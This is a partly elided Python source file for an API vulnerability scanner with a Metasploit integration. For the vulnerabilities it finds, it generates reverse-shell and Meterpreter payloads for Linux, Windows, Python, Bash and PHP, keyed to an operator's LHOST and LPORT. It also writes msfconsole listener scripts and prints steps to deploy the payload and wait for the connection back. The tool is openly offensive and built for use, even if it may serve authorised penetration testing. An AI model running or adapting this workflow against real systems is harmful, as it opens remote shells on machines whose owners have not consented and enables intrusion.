...
class MetasploitIntegration:
    """Integration with Metasploit Framework for exploit generation"""
    
    def __init__(self):
        self.msf_path = self._find_metasploit()
        self.payloads_dir = "aapipii_payloads"
        self._create_payload_dir()
    ...
    def _create_payload_dir(self):
        """Create directory for storing payloads"""
    ...
    def generate_payload(self, payload_type, lhost, lport, output_format='elf'):
        """Generate a Metasploit payload"""
        if not self.is_available():
            print(f"{Colors.RED}[-] Metasploit not found. Install with: sudo apt install metasploit-framework{Colors.RESET}")
            return None
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"{self.payloads_dir}/payload_{payload_type.replace('/', '_')}_{timestamp}"
        ...
        filename += extensions.get(output_format, '')
        ...
        print(f"{Colors.CYAN}[*] Generating payload: {payload_type}{Colors.RESET}")
        print(f"{Colors.CYAN}[*] LHOST={lhost}, LPORT={lport}, Format={output_format}{Colors.RESET}")
        ...
        try:
            ...
            if result.returncode == 0:
                ...
                print(f"{Colors.YELLOW}[*] Payload size: {os.path.getsize(filename)} bytes{Colors.RESET}")
                return filename
            else:
                print(f"{Colors.RED}[-] Failed to generate payload{Colors.RESET}")
                if result.stderr:
                    print(f"{Colors.RED}    Error: {result.stderr}{Colors.RESET}")
                return None
                
        except subprocess.TimeoutExpired:
            print(f"{Colors.RED}[-] Payload generation timed out{Colors.RESET}")
            return None
        except Exception as e:
            print(f"{Colors.RED}[-] Error generating payload: {e}{Colors.RESET}")
            return None
    
    def launch_listener(self, payload_type, lhost, lport):
        """Generate resource script to launch Metasploit listener"""
        if not self.is_available():
            print(f"{Colors.RED}[-] Metasploit not found{Colors.RESET}")
            return None
        ...
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        rc_file = f"{self.payloads_dir}/listener_{timestamp}.rc"
        
        rc_content = f"""use {handler}
...
"""
        ...
        try:
            ...
            print(f"{Colors.GREEN}[+] Listener script created: {rc_file}{Colors.RESET}")
            print(f"{Colors.CYAN}[*] To start listener, run:{Colors.RESET}")
            print(f"{Colors.YELLOW}    msfconsole -r {rc_file}{Colors.RESET}")
            
            return rc_file
            
        except Exception as e:
            print(f"{Colors.RED}[-] Error creating listener script: {e}{Colors.RESET}")
            return None
    
    def get_payload_recommendations(self, vulnerability_type):
        """Recommend payloads based on vulnerability type"""
        recommendations = {
            'sql_injection': [
        ...
        return recommendations.get(vulnerability_type, recommendations['default'])
    
    def show_exploit_menu(self, vulnerabilities):
        """Interactive menu for exploit generation"""
        if not vulnerabilities:
            print(f"{Colors.YELLOW}[!] No vulnerabilities found to exploit{Colors.RESET}")
            return
        
        print(f"\n{Colors.BOLD}{Colors.YELLOW}{'='*70}")
        print("METASPLOIT PAYLOAD GENERATION MENU")
        print(f"{'='*70}{Colors.RESET}\n")
        
        print(f"{Colors.CYAN}Available Vulnerabilities:{Colors.RESET}")
        for i, vuln in enumerate(vulnerabilities, 1):
            severity_color = Colors.RED if vuln['severity'] == 'High' else Colors.YELLOW
            print(f"  {i}. {severity_color}[{vuln['severity']}]{Colors.RESET} {vuln['type']}")
            print(f"     URL: {vuln['url']}")
        
        print(f"\n{Colors.CYAN}Payload Options:{Colors.RESET}")
        print("  1. Linux Meterpreter Reverse TCP")
        print("  2. Linux Shell Reverse TCP")
        print("  3. Windows Meterpreter Reverse TCP")
        print("  4. Python Reverse Shell")
        print("  5. Bash Reverse Shell")
        print("  6. PHP Meterpreter")
        print("  7. Custom Payload")
...
class APIScanner:
    ...
    def generate_exploit(self, lhost=None, lport=4444):
        """Generate exploits for discovered vulnerabilities"""
        if not self.vulnerabilities:
            print(f"{Colors.YELLOW}[!] No vulnerabilities to exploit{Colors.RESET}")
            return
        
        if not self.msf.is_available():
            print(f"{Colors.RED}[-] Metasploit Framework not found{Colors.RESET}")
            print(f"{Colors.CYAN}[*] Install with: sudo apt install metasploit-framework{Colors.RESET}")
            return
        
        # Show exploit menu
        self.msf.show_exploit_menu(self.vulnerabilities)
        
        # Get user's local IP if not provided
        if not lhost:
            lhost = self._get_local_ip()
        
        print(f"\n{Colors.CYAN}[*] Your IP: {lhost}{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Listener Port: {lport}{Colors.RESET}")
        
        # Payload options
        payloads = {
            '1': ('linux/x64/meterpreter/reverse_tcp', 'elf'),
            '2': ('linux/x64/shell_reverse_tcp', 'elf'),
            '3': ('windows/x64/meterpreter/reverse_tcp', 'exe'),
            '4': ('cmd/unix/reverse_python', 'raw'),
            '5': ('cmd/unix/reverse_bash', 'raw'),
            '6': ('php/meterpreter/reverse_tcp', 'raw'),
        }
        
        try:
            choice = input(f"\n{Colors.CYAN}Select payload [1-7]: {Colors.RESET}").strip()
            
            if choice == '7':
                custom_payload = input(f"{Colors.CYAN}Enter custom payload: {Colors.RESET}").strip()
                custom_format = input(f"{Colors.CYAN}Output format [elf/exe/raw/php]: {Colors.RESET}").strip() or 'raw'
                payload_info = (custom_payload, custom_format)
            ...
            payload_type, output_format = payload_info
            
            # Generate payload
            payload_file = self.msf.generate_payload(payload_type, lhost, lport, output_format)
            
            if payload_file:
                # Generate listener script
                print(f"\n{Colors.CYAN}[*] Generating listener script...{Colors.RESET}")
                rc_file = self.msf.launch_listener(payload_type, lhost, lport)
                
                print(f"\n{Colors.GREEN}{'='*70}")
                print("EXPLOIT GENERATION COMPLETE")
                print(f"{'='*70}{Colors.RESET}")
                print(f"\n{Colors.BOLD}Next Steps:{Colors.RESET}")
                print(f"  1. Start the listener: {Colors.YELLOW}msfconsole -r {rc_file}{Colors.RESET}")
                print(f"  2. Deploy payload: {Colors.YELLOW}{payload_file}{Colors.RESET}")
                print(f"  3. Wait for connection on port {lport}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Exploit generation cancelled{Colors.RESET}")
        except Exception as e:
...
def main():
    ...
    parser.add_argument('--exploit', '-e', action='store_true', help='Generate Metasploit payloads for vulnerabilities')
    parser.add_argument('--lhost', help='Local host IP for reverse connections')
    parser.add_argument('--lport', type=int, default=4444, help='Local port for reverse connections (default: 4444)')
    ...
    if args.exploit:
        print(f"\n{Colors.BOLD}{Colors.CYAN}[*] Launching Metasploit Integration...{Colors.RESET}\n")
        scanner.generate_exploit(lhost=args.lhost, lport=args.lport)
